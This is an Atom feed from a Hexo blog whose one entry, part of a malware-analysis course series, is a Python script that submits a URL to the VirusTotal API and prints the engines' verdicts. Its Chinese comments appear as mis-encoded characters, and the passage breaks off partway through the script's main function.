<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>CHANGMEN&#39;ä¸ªäººåšå®¢</title>
  
  
  <link href="https://250wuyifan.github.io/atom.xml" rel="self"/>
  
  <link href="https://250wuyifan.github.io/"/>
  <updated>2025-11-11T17:51:42.966Z</updated>
  <id>https://250wuyifan.github.io/</id>
  
  <author>
    <name>CHANGMEN</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>æ¶æ„ä»£ç åˆ†æç³»åˆ—è¯¾ç¨‹-è°ƒç”¨VTæ£€æµ‹URLè„šæœ¬</title>
    <link href="https://250wuyifan.github.io/2025/11/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-%E8%B0%83%E7%94%A8VT%E6%A3%80%E6%B5%8BURL%E8%84%9A%E6%9C%AC/"/>
    <id>https://250wuyifan.github.io/2025/11/12/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-%E8%B0%83%E7%94%A8VT%E6%A3%80%E6%B5%8BURL%E8%84%9A%E6%9C%AC/</id>
    <published>2025-11-11T17:48:40.000Z</published>
    <updated>2025-11-11T17:51:42.966Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">VirusTotal API æµ‹è¯•è„šæœ¬</span></span><br><span class="line"><span class="string">å°†JavaScriptä»£ç è½¬æ¢ä¸ºPythonå®ç°</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode, urlparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># VirusTotal APIé…ç½®</span></span><br><span class="line"><span class="comment"># ä¼˜å…ˆä»ç¯å¢ƒå˜é‡è¯»å–APIå¯†é’¥ï¼Œå¦‚æœæ²¡æœ‰åˆ™ä½¿ç”¨é»˜è®¤å€¼</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">API_KEY = os.getenv(<span class="string">&#x27;VT_API_KEY&#x27;</span>, <span class="string">&#x27;è‡ªå·±çš„KEY&#x27;</span>)</span><br><span class="line">API_BASE_URL = <span class="string">&#x27;https://www.virustotal.com/api/v3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯·æ±‚å¤´</span></span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    <span class="string">&#x27;x-apikey&#x27;</span>: API_KEY,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_url_with_virustotal</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ä½¿ç”¨VirusTotal APIæ£€æŸ¥URL</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        url: è¦æ£€æŸ¥çš„URL</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        tuple: (status, malicious_count, details)</span></span><br><span class="line"><span class="string">            status: &#x27;malicious&#x27; æˆ– &#x27;safe&#x27;</span></span><br><span class="line"><span class="string">            malicious_count: æ¶æ„æ£€æµ‹æ•°é‡</span></span><br><span class="line"><span class="string">            details: è¯¦ç»†ä¿¡æ¯å­—å…¸</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># ç¬¬ä¸€æ­¥ï¼šæäº¤URLè¿›è¡Œåˆ†æ</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ğŸ“¤ æ­£åœ¨æäº¤URLåˆ°VirusTotal: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        submit_url = <span class="string">f&quot;<span class="subst">&#123;API_BASE_URL&#125;</span>/urls&quot;</span></span><br><span class="line">        payload = &#123;<span class="string">&#x27;url&#x27;</span>: url&#125;</span><br><span class="line">        </span><br><span class="line">        response = requests.post(</span><br><span class="line">            submit_url,</span><br><span class="line">            headers=HEADERS,</span><br><span class="line">            data=urlencode(payload),</span><br><span class="line">            timeout=<span class="number">30</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ£€æŸ¥æäº¤æ˜¯å¦æˆåŠŸ</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">            error_msg = <span class="string">f&quot;æäº¤å¤±è´¥: HTTP <span class="subst">&#123;response.status_code&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                error_data = response.json()</span><br><span class="line">                error_msg += <span class="string">f&quot; - <span class="subst">&#123;error_data.get(<span class="string">&#x27;error&#x27;</span>, &#123;&#125;</span>).get(&#x27;message&#x27;, &#x27;æœªçŸ¥é”™è¯¯&#x27;)&#125;&quot;</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                error_msg += <span class="string">f&quot; - <span class="subst">&#123;response.text[:<span class="number">200</span>]&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">raise</span> Exception(error_msg)</span><br><span class="line">        </span><br><span class="line">        data = response.json()</span><br><span class="line">        analysis_id = data.get(<span class="string">&#x27;data&#x27;</span>, &#123;&#125;).get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> analysis_id:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;æ— æ³•è·å–åˆ†æIDï¼Œå“åº”æ•°æ®: &quot;</span> + <span class="built_in">str</span>(data))</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;âœ… URLå·²æäº¤ï¼Œåˆ†æID: <span class="subst">&#123;analysis_id&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;â³ ç­‰å¾…3ç§’è®©VirusTotalå®Œæˆåˆ†æ...&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ç­‰å¾…3ç§’ï¼ˆå’ŒJSä»£ç ä¿æŒä¸€è‡´ï¼‰</span></span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ç¬¬äºŒæ­¥ï¼šè·å–åˆ†æç»“æœ</span></span><br><span class="line">        analysis_url = <span class="string">f&quot;<span class="subst">&#123;API_BASE_URL&#125;</span>/analyses/<span class="subst">&#123;analysis_id&#125;</span>&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ğŸ“¥ æ­£åœ¨è·å–åˆ†æç»“æœ...&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        analysis_response = requests.get(</span><br><span class="line">            analysis_url,</span><br><span class="line">            headers=&#123;<span class="string">&#x27;x-apikey&#x27;</span>: API_KEY&#125;,</span><br><span class="line">            timeout=<span class="number">30</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> analysis_response.status_code != <span class="number">200</span>:</span><br><span class="line">            error_msg = <span class="string">f&quot;è·å–ç»“æœå¤±è´¥: HTTP <span class="subst">&#123;analysis_response.status_code&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                error_data = analysis_response.json()</span><br><span class="line">                error_msg += <span class="string">f&quot; - <span class="subst">&#123;error_data.get(<span class="string">&#x27;error&#x27;</span>, &#123;&#125;</span>).get(&#x27;message&#x27;, &#x27;æœªçŸ¥é”™è¯¯&#x27;)&#125;&quot;</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                error_msg += <span class="string">f&quot; - <span class="subst">&#123;analysis_response.text[:<span class="number">200</span>]&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">raise</span> Exception(error_msg)</span><br><span class="line">        </span><br><span class="line">        result = analysis_response.json()</span><br><span class="line">        attributes = result.get(<span class="string">&#x27;data&#x27;</span>, &#123;&#125;).get(<span class="string">&#x27;attributes&#x27;</span>, &#123;&#125;)</span><br><span class="line">        stats = attributes.get(<span class="string">&#x27;stats&#x27;</span>, &#123;&#125;)</span><br><span class="line">        </span><br><span class="line">        malicious_count = stats.get(<span class="string">&#x27;malicious&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">        harmless_count = stats.get(<span class="string">&#x27;harmless&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">        suspicious_count = stats.get(<span class="string">&#x27;suspicious&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">        undetected_count = stats.get(<span class="string">&#x27;undetected&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è·å–è¯¦ç»†ç»“æœ</span></span><br><span class="line">        results = attributes.get(<span class="string">&#x27;results&#x27;</span>, &#123;&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># åˆ¤æ–­çŠ¶æ€</span></span><br><span class="line">        <span class="keyword">if</span> malicious_count &gt; <span class="number">0</span>:</span><br><span class="line">            status = <span class="string">&#x27;malicious&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            status = <span class="string">&#x27;safe&#x27;</span></span><br><span class="line">        </span><br><span class="line">        details = &#123;</span><br><span class="line">            <span class="string">&#x27;malicious&#x27;</span>: malicious_count,</span><br><span class="line">            <span class="string">&#x27;harmless&#x27;</span>: harmless_count,</span><br><span class="line">            <span class="string">&#x27;suspicious&#x27;</span>: suspicious_count,</span><br><span class="line">            <span class="string">&#x27;undetected&#x27;</span>: undetected_count,</span><br><span class="line">            <span class="string">&#x27;total_engines&#x27;</span>: malicious_count + harmless_count + suspicious_count + undetected_count,</span><br><span class="line">            <span class="string">&#x27;results&#x27;</span>: results,</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span>: attributes.get(<span class="string">&#x27;status&#x27;</span>, <span class="string">&#x27;unknown&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> status, malicious_count, details</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;è¯·æ±‚è¶…æ—¶ï¼Œè¯·æ£€æŸ¥ç½‘ç»œè¿æ¥&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">f&quot;ç½‘ç»œè¯·æ±‚å¤±è´¥: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">f&quot;æ£€æŸ¥å¤±è´¥: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_result</span>(<span class="params">status, malicious_count, details</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ‰“å°æ£€æŸ¥ç»“æœ&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ğŸ“Š VirusTotal æ£€æŸ¥ç»“æœ&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> status == <span class="string">&#x27;malicious&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;âš ï¸  çŠ¶æ€: å¯ç–‘/æ¶æ„&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ğŸ”´ æ¶æ„æ£€æµ‹æ•°: <span class="subst">&#123;malicious_count&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;âœ… çŠ¶æ€: å®‰å…¨&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ğŸŸ¢ æ¶æ„æ£€æµ‹æ•°: <span class="subst">&#123;malicious_count&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nğŸ“ˆ è¯¦ç»†ç»Ÿè®¡:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;   - æ¶æ„ (Malicious): <span class="subst">&#123;details[<span class="string">&#x27;malicious&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;   - å®‰å…¨ (Harmless): <span class="subst">&#123;details[<span class="string">&#x27;harmless&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;   - å¯ç–‘ (Suspicious): <span class="subst">&#123;details[<span class="string">&#x27;suspicious&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;   - æœªæ£€æµ‹ (Undetected): <span class="subst">&#123;details[<span class="string">&#x27;undetected&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;   - æ€»å¼•æ“æ•°: <span class="subst">&#123;details[<span class="string">&#x27;total_engines&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;   - åˆ†æçŠ¶æ€: <span class="subst">&#123;details[<span class="string">&#x27;status&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å¦‚æœæœ‰æ¶æ„æ£€æµ‹ï¼Œæ˜¾ç¤ºå“ªäº›å¼•æ“æ£€æµ‹åˆ°äº†</span></span><br><span class="line">    <span class="keyword">if</span> malicious_count &gt; <span class="number">0</span> <span class="keyword">and</span> details[<span class="string">&#x27;results&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nğŸ” æ£€æµ‹åˆ°å¨èƒçš„å¼•æ“:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> engine_name, engine_result <span class="keyword">in</span> details[<span class="string">&#x27;results&#x27;</span>].items():</span><br><span class="line">            <span class="keyword">if</span> engine_result.get(<span class="string">&#x27;category&#x27;</span>) == <span class="string">&#x27;malicious&#x27;</span>:</span><br><span class="line">                result = engine_result.get(<span class="string">&#x27;result&#x27;</span>, <span class="string">&#x27;æœªçŸ¥å¨èƒ&#x27;</span>)</span><br><span class="line">                method = engine_result.get(<span class="string">&#x27;method&#x27;</span>, <span class="string">&#x27;æœªçŸ¥æ–¹æ³•&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   - <span class="subst">&#123;engine_name&#125;</span>: <span class="subst">&#123;result&#125;</span> (æ–¹æ³•: <span class="subst">&#123;method&#125;</span>)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_and_fix_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    éªŒè¯å¹¶ä¿®å¤URLæ ¼å¼</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        url: åŸå§‹URLå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        str: ä¿®å¤åçš„æœ‰æ•ˆURL</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    url = url.strip()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;URLä¸èƒ½ä¸ºç©º&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ç§»é™¤å‰åç©ºæ ¼å’Œå¼•å·</span></span><br><span class="line">    url = url.strip(<span class="string">&#x27; &quot;\&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ£€æµ‹å¹¶ä¿®å¤å¸¸è§é”™è¯¯æ ¼å¼</span></span><br><span class="line">    <span class="comment"># 1. http:example.com -&gt; http://example.com</span></span><br><span class="line">    <span class="comment"># 2. https:example.com -&gt; https://example.com</span></span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^https?:[^/]&#x27;</span>, url):</span><br><span class="line">        <span class="keyword">if</span> url.startswith(<span class="string">&#x27;https:&#x27;</span>):</span><br><span class="line">            url = url.replace(<span class="string">&#x27;https:&#x27;</span>, <span class="string">&#x27;https://&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> url.startswith(<span class="string">&#x27;http:&#x27;</span>):</span><br><span class="line">            url = url.replace(<span class="string">&#x27;http:&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;â„¹ï¸  ä¿®å¤URLæ ¼å¼ï¼ˆæ·»åŠ //ï¼‰: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. å¦‚æœå®Œå…¨æ²¡æœ‰åè®®ï¼Œæ·»åŠ https://</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^https?://&#x27;</span>, url, re.IGNORECASE):</span><br><span class="line">        <span class="comment"># æ£€æŸ¥æ˜¯å¦ä»¥//å¼€å¤´ï¼ˆåè®®ç›¸å¯¹URLï¼‰</span></span><br><span class="line">        <span class="keyword">if</span> url.startswith(<span class="string">&#x27;//&#x27;</span>):</span><br><span class="line">            url = <span class="string">&#x27;https:&#x27;</span> + url</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;â„¹ï¸  æ·»åŠ åè®®: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url = <span class="string">&#x27;https://&#x27;</span> + url</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;â„¹ï¸  è‡ªåŠ¨æ·»åŠ åè®®: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># éªŒè¯URLæ ¼å¼</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parsed = urlparse(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> parsed.netloc:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;æ— æ•ˆçš„URLæ ¼å¼: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ç¡®ä¿æœ‰scheme</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> parsed.scheme:</span><br><span class="line">            url = <span class="string">&#x27;https://&#x27;</span> + url</span><br><span class="line">            parsed = urlparse(url)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># åŸºæœ¬éªŒè¯ï¼šå¿…é¡»æœ‰åŸŸå</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> parsed.netloc <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> parsed.netloc:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;URLç¼ºå°‘æœ‰æ•ˆåŸŸå: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;URLæ ¼å¼é”™è¯¯: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ä¸»å‡½æ•°&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ğŸ›¡ï¸  VirusTotal URL å®‰å…¨æ£€æŸ¥å·¥å…·&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ä»å‘½ä»¤è¡Œå‚æ•°è·å–URLï¼Œå¦‚æœæ²¡æœ‰åˆ™æç¤ºè¾“å…¥</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        url = sys.argv[<span class="number">1</span>].strip()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = <span class="built_in">input</span>(<span class="string">&quot;\nè¯·è¾“å…¥è¦æ£€æŸ¥çš„URL: &quot;</span>).strip()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;âŒ é”™è¯¯: æœªæä¾›URL&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># éªŒè¯å¹¶ä¿®å¤URL</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = validate_and_fix_url(url)</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;âŒ URLéªŒè¯å¤±è´¥: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nğŸ’¡ æç¤º: URLæ ¼å¼ç¤ºä¾‹:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;   - https://www.example.com&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;   - http://example.com&quot;</span>)</span><br><span 